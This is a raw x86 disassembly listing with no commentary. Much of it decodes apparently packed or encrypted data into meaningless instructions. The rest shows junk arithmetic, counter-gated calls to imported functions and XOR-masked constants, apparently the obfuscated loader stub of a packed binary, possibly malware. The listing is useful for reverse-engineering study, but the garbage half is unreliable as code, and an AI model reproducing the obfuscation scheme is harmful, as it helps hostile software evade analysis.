  405723:	scas   al,BYTE PTR es:[edi]
  405724:	xchg   BYTE PTR [eax+0x1eaf2177],al
  40572a:	fwait
  40572b:	mov    ?,WORD PTR [eax+ecx*2+0x69c2eed0]
  405732:	pop    esi
  405733:	cmp    DWORD PTR [esi-0x77e2515c],0x219a8279
  40573d:	mov    BYTE PTR [edi+0x61],bh
  405740:	and    DWORD PTR [ebp+eax*8+0x3a],eax
  405744:	dec    edi
  405745:	call   esp
  405747:	je     0x40572d
  405749:	jle    0x405751
  40574b:	adc    bh,BYTE PTR [ebp+0x4a]
  40574e:	out    0x95,eax
  405750:	or     al,0x89
  405752:	out    dx,al
  405753:	ins    DWORD PTR es:[edi],dx
  405754:	inc    ebp
  405755:	cmp    BYTE PTR [ecx-0x720f6142],0x2
  40575c:	mov    dh,0xc3
  40575e:	les    ebp,FWORD PTR [esi-0xa0d1a4e]
  405764:	dec    ecx
  405765:	test   al,0xe8
  405767:	add    al,BYTE PTR [edx]
  405769:	adc    DWORD PTR [edx+0x3a],esi
  40576c:	push   edx
  40576d:	pop    ebp
  40576e:	or     BYTE PTR [eax-0x5c],cl
  405771:	imul   ecx,DWORD PTR [eax],0xbb09bad6
  405777:	sbb    al,0x61
  405779:	add    al,0x81
  40577b:	and    al,0x69
  40577d:	dec    ebp
  40577e:	das    
  40577f:	adc    ebp,DWORD PTR [edx+0x76]
  405782:	xchg   edx,eax
  405783:	lds    edx,FWORD PTR [edx-0x60d15d71]
  405789:	jmp    FWORD PTR [edi+0x27]
  40578c:	inc    edx
  40578d:	push   es
  40578e:	sub    edi,DWORD PTR [eax]
  405790:	or     edi,ecx
  405792:	and    dl,bh
  405794:	adc    eax,0x510a1cba
  405799:	mov    ebp,0x21607221
  40579e:	jmp    0x9bc0:0x76d2a8c1
  4057a5:	jle    0x4057d1
  4057a7:	jl     0x4057b6
  4057a9:	or     bl,dl
  4057ab:	mov    edi,DWORD PTR ds:0x42f46347
  4057b1:	mov    esi,0x58d9cc34
  4057b6:	inc    esp
  4057b7:	jmp    0x405760
  4057b9:	add    DWORD PTR [edx+0x6b1416ee],ebx
  4057bf:	push   ds
  4057c0:	mov    cl,0xad
  4057c2:	repz jp 0x405798
  4057c5:	sub    DWORD PTR ds:0xa940f81e,ebx
  4057cb:	mov    edx,0xe255e6cc
  4057d0:	mov    dl,0x1f
  4057d2:	fstp   QWORD PTR [ecx]
  4057d4:	pop    ebx
  4057d5:	cdq    
  4057d6:	fsub   QWORD PTR [ebx]
  4057d8:	icebp  
  4057d9:	ror    DWORD PTR [edi+0x3dd9bd5f],cl
  4057df:	loope  0x4057ba
  4057e1:	out    0xba,eax
  4057e3:	mov    eax,ds:0x1b92bdc2
  4057e8:	mov    bl,0xf6
  4057ea:	jmp    0x54eb2a56
  4057ef:	stos   DWORD PTR es:[edi],eax
  4057f0:	push   0x603bfc28
  4057f5:	cwde   
  4057f6:	xor    esp,DWORD PTR [ecx]
  4057f8:	rol    ecx,cl
  4057fa:	add    eax,0x7ed222a3
  4057ff:	sti    
  405800:	jmp    0xdbf5c2af
  405805:	out    dx,eax
  405806:	sub    BYTE PTR [eax-0x626916f5],dl
  40580c:	data16 (bad) 
  40580e:	and    eax,0x60f5ed7e
  405813:	add    eax,0x751c67f4
  405818:	mov    ebp,0x3139a90d
  40581d:	pop    ebx
  40581e:	and    ebx,DWORD PTR [esi]
  405820:	retf   0x6067
  405823:	call   FWORD PTR [edx]
  405825:	pop    ebx
  405826:	aaa    
  405827:	out    0x7f,al
  405829:	dec    ebx
  40582a:	push   esi
  40582b:	jo     0x405827
  40582d:	shr    DWORD PTR [ebx-0x42],0x17
  405831:	cmp    DWORD PTR [ebx-0x45],eax
  405834:	xchg   BYTE PTR [esi+0x5b4fba59],bl
  40583a:	xor    DWORD PTR [ebx],0x8d010036
  405840:	xchg   ecx,eax
  405841:	popf   
  405842:	add    al,0x14
  405844:	out    dx,al
  405845:	rcr    BYTE PTR [esi],0x47
  405848:	xchg   ecx,eax
  405849:	jbe    0x405871
  40584b:	or     DWORD PTR [ebp-0x39],0x24
  40584f:	jle    0x40588a
  405851:	in     eax,0x81
  405853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405854:	pop    ecx
  405855:	lea    edi,[edx-0x616130a4]
  40585b:	dec    edx
  40585c:	(bad)  
  40585d:	pop    esi
  40585e:	ret    
  40585f:	and    al,0x51
  405861:	and    eax,0xaacba2fc
  405866:	adc    BYTE PTR [ebx-0x45d254a5],cl
  40586c:	push   edx
  40586d:	jbe    0x405836
  40586f:	xchg   ecx,edx
  405871:	arpl   WORD PTR [ecx],cx
  405873:	mov    dl,0x87
  405875:	retfw  0xf3fa
  405879:	xor    al,BYTE PTR [edx+0x77]
  40587c:	mov    ch,0xa5
  40587e:	pop    ebp
  40587f:	dec    ecx
  405880:	or     ch,BYTE PTR [edi+0x5ee7bf49]
  405886:	out    dx,eax
  405887:	and    eax,0xdac70da9
  40588c:	push   ss
  40588d:	les    eax,FWORD PTR [ecx]
  40588f:	xchg   edi,eax
  405890:	fcomp  QWORD PTR [edx-0x5fdc832f]
  405896:	hlt    
  405897:	pop    es
  405898:	xor    al,0x1b
  40589a:	sub    BYTE PTR [ebx-0x5f],bl
  40589d:	loope  0x40585f
  40589f:	mov    bh,0xbb
  4058a1:	cmp    al,0xec
  4058a3:	(bad)  
  4058a4:	cdq    
  4058a5:	inc    ebx
  4058a6:	retf   0x3898
  4058a9:	xchg   ebx,eax
  4058aa:	xor    DWORD PTR [ecx+0x71],0x16
  4058ae:	sub    edi,DWORD PTR [edi]
  4058b0:	sbb    dh,BYTE PTR [ebx-0x5c8c0c68]
  4058b6:	xchg   esi,eax
  4058b7:	inc    ebp
  4058b8:	xor    al,0xf1
  4058ba:	xlat   BYTE PTR ds:[ebx]
  4058bb:	push   ecx
  4058bc:	mov    bl,0x2a
  4058be:	repz jg 0x405936
  4058c1:	lods   al,BYTE PTR ds:[esi]
  4058c2:	and    BYTE PTR [edx],al
  4058c4:	das    
  4058c5:	mov    eax,0xdf9c8741
  4058ca:	retf   
  4058cb:	or     al,0xd5
  4058cd:	cmc    
  4058ce:	and    bh,BYTE PTR [esi]
  4058d0:	xchg   esp,eax
  4058d1:	test   BYTE PTR [ebp+0x5c6d7e50],bh
  4058d7:	mov    ds:0x62efdb0d,eax
  4058dc:	repz inc esp
  4058de:	xchg   ebp,esi
  4058e0:	inc    esp
  4058e1:	add    edx,eax
  4058e3:	fistp  DWORD PTR [eax+0x2d]
  4058e6:	push   edx
  4058e7:	add    cl,BYTE PTR [esi]
  4058e9:	mov    al,ds:0x894b682b
  4058ee:	inc    ebp
  4058ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f0:	inc    ebx
  4058f1:	mov    esi,0xdd5c35f8
  4058f6:	lods   al,BYTE PTR ds:[esi]
  4058f7:	mov    dh,0x44
  4058f9:	pop    edi
  4058fa:	lahf   
  4058fb:	in     eax,0x6c
  4058fd:	and    ah,0x70
  405900:	lods   eax,DWORD PTR ds:[esi]
  405901:	cli    
  405902:	fiadd  WORD PTR [ebp-0x5f]
  405905:	shr    BYTE PTR [ecx-0x41],0x6e
  405909:	retf   
  40590a:	call   0xa261d8b3
  40590f:	fdivr  st,st(4)
  405911:	outs   dx,DWORD PTR ds:[esi]
  405912:	addr16 inc esp
  405914:	jne    0x405940
  405916:	stc    
  405917:	mov    eax,0x6f9179ac
  40591c:	fist   WORD PTR [edi]
  40591e:	fsub   QWORD PTR [ebx+0x40f7c432]
  405924:	cli    
  405925:	adc    eax,0xc5f1a8de
  40592a:	push   esi
  40592b:	jmp    0xc6ee:0x5ea9054c
  405932:	push   edx
  405933:	rcr    ah,cl
  405935:	mov    ah,0xb9
  405937:	add    eax,0x7803c41b
  40593c:	inc    esp
  40593d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593e:	jo     0x40593e
  405940:	jo     0x4059a7
  405942:	pop    ebp
  405943:	clc    
  405944:	arpl   WORD PTR [esi+0x39344262],ax
  40594a:	fwait
  40594b:	adc    eax,0xa3f7d08c
  405950:	push   edi
  405951:	sahf   
  405952:	inc    eax
  405953:	push   esi
  405954:	push   ss
  405955:	jae    0x405977
  405957:	cmp    BYTE PTR [ebx+0x765b0373],cl
  40595d:	dec    edi
  40595e:	(bad)  
  40595f:	jne    0x4059ad
  405961:	push   ebp
  405962:	gs adc ecx,esp
  405965:	mov    ds:0x82307621,eax
  40596a:	pop    ebx
  40596b:	cmp    eax,0x3714338d
  405970:	ret    
  405971:	mov    al,ds:0x15070c1a
  405976:	mov    ss,WORD PTR [ebx+0x1c]
  405979:	outs   dx,DWORD PTR ds:[esi]
  40597a:	dec    edi
  40597b:	pop    esi
  40597c:	xchg   edx,eax
  40597d:	mov    edi,0xb9dd51b8
  405982:	shl    DWORD PTR [edx+0x67607a80],cl
  405988:	mov    ecx,0x38392ac7
  40598d:	sub    al,0x52
  40598f:	adc    BYTE PTR [edx],0xa4
  405992:	push   esp
  405993:	(bad)  
  405994:	dec    ecx
  405995:	sar    BYTE PTR [edx-0x1d594cc6],0xdb
  40599c:	arpl   di,sp
  40599e:	jge    0x40597f
  4059a0:	sub    al,0xac
  4059a2:	jo     0x40596e
  4059a4:	adc    dh,BYTE PTR [edi-0x50]
  4059a7:	call   0xccb1:0xe2e42f5c
  4059ae:	(bad)  
  4059af:	jae    0x405a28
  4059b1:	jnp    0x4059ea
  4059b3:	push   esp
  4059b4:	aam    0x23
  4059b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b7:	sar    DWORD PTR [ebx+ebx*1+0x1a],cl
  4059bb:	or     ch,BYTE PTR [esi-0x24]
  4059be:	iret   
  4059bf:	in     al,dx
  4059c0:	add    eax,0x136eb713
  4059c5:	push   cs
  4059c6:	outs   dx,BYTE PTR ds:[esi]
  4059c7:	aas    
  4059c8:	and    DWORD PTR [ecx-0x2e47fa03],0x7
  4059cf:	adc    al,0x8b
  4059d1:	into   
  4059d2:	add    esi,DWORD PTR [edi-0x5d]
  4059d5:	sbb    DWORD PTR [ecx+edi*1],esi
  4059d8:	adc    eax,0x7f046eae
  4059dd:	mov    edx,0xe30859e2
  4059e2:	cdq    
  4059e3:	push   esi
  4059e4:	xchg   edi,eax
  4059e5:	das    
  4059e6:	push   ecx
  4059e7:	xlat   BYTE PTR ds:[ebx]
  4059e8:	daa    
  4059e9:	mov    ?,WORD PTR [edi]
  4059eb:	xchg   esp,eax
  4059ec:	lods   al,BYTE PTR ds:[esi]
  4059ed:	(bad)  
  4059ee:	push   esi
  4059ef:	std    
  4059f0:	cmp    BYTE PTR [ebx-0x1080adac],ch
  4059f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059f7:	push   eax
  4059f8:	push   0xffffffda
  4059fa:	fdivr  QWORD PTR [edi-0x2a8bb037]
  405a00:	jmp    0x40598c
  405a02:	(bad)  
  405a03:	mov    cl,BYTE PTR [edx]
  405a05:	push   0x644fcc8c
  405a0a:	out    dx,al
  405a0b:	pop    ecx
  405a0c:	xchg   DWORD PTR [ebx],ebp
  405a0e:	clc    
  405a0f:	mov    ecx,0x56ab143c
  405a14:	xchg   DWORD PTR [ecx],edx
  405a16:	ins    DWORD PTR es:[edi],dx
  405a17:	and    bl,BYTE PTR [eax-0x41ed0f4d]
  405a1d:	xlat   BYTE PTR ds:[ebx]
  405a1e:	sbb    al,0xcc
  405a20:	les    esi,FWORD PTR [ecx+0x78588beb]
  405a26:	sbb    al,0x92
  405a28:	push   es
  405a29:	mov    eax,ds:0x7e6bd877
  405a2e:	push   esi
  405a2f:	xchg   edi,eax
  405a30:	sbb    ebx,DWORD PTR [edx-0x59e358b4]
  405a36:	inc    edi
  405a37:	aas    
  405a38:	stc    
  405a39:	leave  
  405a3a:	adc    DWORD PTR [eax+0x5f],esp
  405a3d:	pop    esp
  405a3e:	add    edi,esp
  405a40:	xor    al,0xa2
  405a42:	or     eax,0x5bce8a2a
  405a47:	das    
  405a48:	mov    bh,0x46
  405a4a:	(bad)  
  405a4b:	mov    cl,0x47
  405a4d:	xchg   edx,eax
  405a4e:	mov    ebx,0xd2912819
  405a53:	out    0xbb,eax
  405a55:	push   ebp
  405a56:	int    0xcc
  405a58:	lods   eax,DWORD PTR ss:[esi]
  405a5a:	jno    0x405a91
  405a5c:	sbb    edi,DWORD PTR [edx+0x32]
  405a5f:	push   es
  405a60:	lahf   
  405a61:	in     eax,0x2a
  405a63:	pop    esp
  405a64:	adc    eax,0x1418fbc8
  405a69:	cmp    ebx,edi
  405a6b:	push   cs
  405a6c:	fbstp  TBYTE PTR [ebp+0x349f79a5]
  405a72:	jae    0x405a31
  405a74:	adc    BYTE PTR [ecx],dh
  405a76:	sub    ecx,edx
  405a78:	add    al,0x8a
  405a7a:	and    al,0xd5
  405a7c:	out    0x5a,eax
  405a7e:	mov    dh,0x83
  405a80:	cli    
  405a81:	pop    ebx
  405a82:	ficomp DWORD PTR [ecx]
  405a84:	stos   BYTE PTR es:[edi],al
  405a85:	xchg   edi,eax
  405a86:	retf   0xbf51
  405a89:	sub    DWORD PTR [esi+0x59122f41],ebx
  405a8f:	hlt    
  405a90:	xchg   ebp,eax
  405a91:	cwde   
  405a92:	add    bl,BYTE PTR [esi+0x28bec0b]
  405a98:	es pop ds
  405a9a:	push   es
  405a9b:	pop    edx
  405a9c:	test   al,0xd0
  405a9e:	push   ds
  405a9f:	les    edi,FWORD PTR [edx-0x40]
  405aa2:	jae    0x405a4b
  405aa4:	aad    0xc7
  405aa6:	push   ss
  405aa7:	scas   al,BYTE PTR es:[edi]
  405aa8:	dec    esi
  405aa9:	push   DWORD PTR [eax+eax*4-0x2e]
  405aad:	(bad)  
  405aae:	ja     0x405a33
  405ab0:	pusha  
  405ab1:	ficom  WORD PTR [ecx+0x1d]
  405ab4:	lods   eax,DWORD PTR ds:[esi]
  405ab5:	or     ebp,edx
  405ab7:	add    DWORD PTR [ebx+ecx*1],esp
  405aba:	sbb    al,dh
  405abc:	ss mov ebp,0xc772a9b4
  405ac2:	mov    edi,0xff99932d
  405ac7:	fisub  DWORD PTR [esi]
  405ac9:	mov    BYTE PTR [ebp+0x58ab54cf],bh
  405acf:	pop    ss
  405ad0:	test   eax,0x548bf279
  405ad5:	dec    edi
  405ad6:	(bad)  
  405ad7:	sbb    cl,al
  405ad9:	lds    esi,FWORD PTR ds:0x36e4d01e
  405adf:	xchg   ebx,eax
  405ae1:	neg    cl
  405ae3:	ins    BYTE PTR es:[edi],dx
  405ae4:	lea    esi,[eax-0x49955d0d]
  405aea:	add    al,0x95
  405aec:	mov    DWORD PTR [esi],esp
  405aee:	add    al,0xd8
  405af0:	int3   
  405af1:	retf   0x832d
  405af4:	int3   
  405af5:	sar    ecx,0x27
  405af8:	sub    al,0xaa
  405afa:	in     eax,0xf5
  405afc:	gs push ebx
  405afe:	jns    0x405ae8
  405b00:	jmp    0xe4d3c7f2
  405b05:	out    0x38,eax
  405b07:	jb     0x405b67
  405b09:	mov    al,ds:0xac26713c
  405b0e:	adc    al,0x84
  405b10:	shld   DWORD PTR [edx],eax,cl
  405b13:	jl     0x405b28
  405b15:	loope  0x405b3f
  405b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b18:	icebp  
  405b19:	iret   
  405b1a:	mov    al,0x27
  405b1c:	dec    edx
  405b1d:	sbb    dl,BYTE PTR [edi+0x57]
  405b20:	addr16 xchg esi,eax
  405b22:	xchg   DWORD PTR [edx+0x17],ebx
  405b25:	jge    0x405b08
  405b27:	sub    al,0x64
  405b29:	jmp    0xe208:0xa0e39278
  405b30:	mov    ebp,0xa48c45e5
  405b35:	repz xor al,0x4b
  405b38:	aad    0xa6
  405b3a:	sub    ecx,eax
  405b3c:	pop    edi
  405b3d:	cs (bad) 
  405b3f:	js     0x405ae8
  405b41:	mov    DWORD PTR [ebx],eax
  405b43:	pop    ss
  405b44:	(bad)  
  405b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b46:	dec    cl
  405b48:	repnz xor esi,DWORD PTR [ebp-0x7c]
  405b4c:	mov    ds:0x1b8d366d,eax
  405b51:	sub    dh,bl
  405b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b54:	test   al,0xf8
  405b56:	ror    edx,0x2e
  405b59:	ror    DWORD PTR [ecx-0x26],0x3f
  405b5d:	xchg   esp,eax
  405b5e:	iret   
  405b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b60:	mov    bh,0xc2
  405b62:	mov    WORD PTR [ebx],fs
  405b64:	xchg   al,dl
  405b66:	pop    ebp
  405b67:	and    al,0x8b
  405b69:	ds (bad) 
  405b6b:	mov    DWORD PTR [esi-0x3f24195b],ebx
  405b71:	add    eax,0x93a8931
  405b76:	mov    DWORD PTR [ecx-0x58],eax
  405b79:	test   BYTE PTR ds:0x9b604925,0x2f
  405b80:	jp     0x405b34
  405b82:	pop    ebx
  405b83:	call   0xd1b5:0x599a9de3
  405b8a:	sub    al,0x20
  405b8c:	sub    DWORD PTR [edx+0x31],ecx
  405b8f:	fsubp  st(5),st
  405b91:	in     eax,dx
  405b92:	imul   ebx,DWORD PTR [ebp-0x6a357ec2],0x7f08358f
  405b9c:	iret   
  405b9d:	mov    DWORD PTR [edx-0x2d7b2dbe],esi
  405ba3:	in     al,dx
  405ba4:	js     0x405b9c
  405ba6:	fsub   DWORD PTR [esp+edi*8+0x5d]
  405baa:	out    dx,eax
  405bab:	ins    BYTE PTR es:[edi],dx
  405bac:	imul   DWORD PTR [edi+0x2687e1f5]
  405bb2:	retf   0xb2c6
  405bb5:	ins    DWORD PTR es:[edi],dx
  405bb6:	stos   BYTE PTR es:[edi],al
  405bb7:	aas    
  405bb8:	jecxz  0x405c30
  405bba:	int    0x64
  405bbc:	nop
  405bbd:	fisttp QWORD PTR [edi]
  405bbf:	leave  
  405bc0:	cdq    
  405bc1:	repnz fcomp DWORD PTR [edi+0x1d]
  405bc5:	mov    cl,0x68
  405bc7:	pop    es
  405bc8:	xor    ah,BYTE PTR [esi]
  405bca:	xor    al,0xad
  405bcc:	dec    ebp
  405bcd:	push   0xe
  405bcf:	push   cs
  405bd0:	pmulhuw mm6,mm3
  405bd3:	jmp    0x405b89
  405bd5:	loope  0x405bbe
  405bd7:	and    BYTE PTR [ebx-0x7fff6927],bl
  405bdd:	xchg   DWORD PTR [ebx],esp
  405bdf:	push   eax
  405be0:	sbb    al,0x79
  405be2:	(bad)  
  405be3:	mov    ebx,0x4ab59847
  405be8:	fnstcw WORD PTR ss:[edx]
  405beb:	scas   eax,DWORD PTR es:[edi]
  405bec:	js     0x405bd7
  405bee:	pop    esp
  405bef:	imul   ebx,DWORD PTR ds:0xfa034f03,0x54
  405bf6:	std    
  405bf7:	retf   0x7c2c
  405bfa:	arpl   WORD PTR [eax+ecx*1+0x2d],bx
  405bfe:	rol    edi,0x5
  405c01:	mov    bh,BYTE PTR [ebp+0x5d0b2e4f]
  405c07:	pusha  
  405c08:	bound  ebp,QWORD PTR [ebx-0x7d]
  405c0b:	add    esi,DWORD PTR [edx+0x3e]
  405c0e:	addr16 aam 0x72
  405c11:	xor    esi,edx
  405c13:	imul   edi,DWORD PTR [ebx+0x6f],0x5b
  405c17:	xchg   edi,eax
  405c18:	inc    ebp
  405c19:	scas   al,BYTE PTR es:[edi]
  405c1a:	in     eax,0xa7
  405c1c:	ja     0x405bc0
  405c1e:	ror    BYTE PTR [si],cl
  405c21:	push   es
  405c22:	imul   edi,esp,0xffffff9c
  405c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c26:	mov    edx,0x872c37f9
  405c2b:	mov    ch,0x67
  405c2d:	sbb    ebp,edi
  405c2f:	sti    
  405c30:	xchg   ecx,eax
  405c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c32:	(bad)  
  405c34:	jp     0x405c4c
  405c36:	shl    DWORD PTR [edi],1
  405c38:	pop    ds
  405c39:	lds    ecx,FWORD PTR [ecx]
  405c3b:	and    BYTE PTR [ebp+0x6c],cl
  405c3e:	sub    DWORD PTR [ebx+0x11],ecx
  405c41:	push   esp
  405c42:	sub    esi,DWORD PTR [esi]
  405c44:	jns    0x405c89
  405c46:	mov    edi,0xa1155a79
  405c4b:	loop   0x405c67
  405c4d:	inc    edx
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
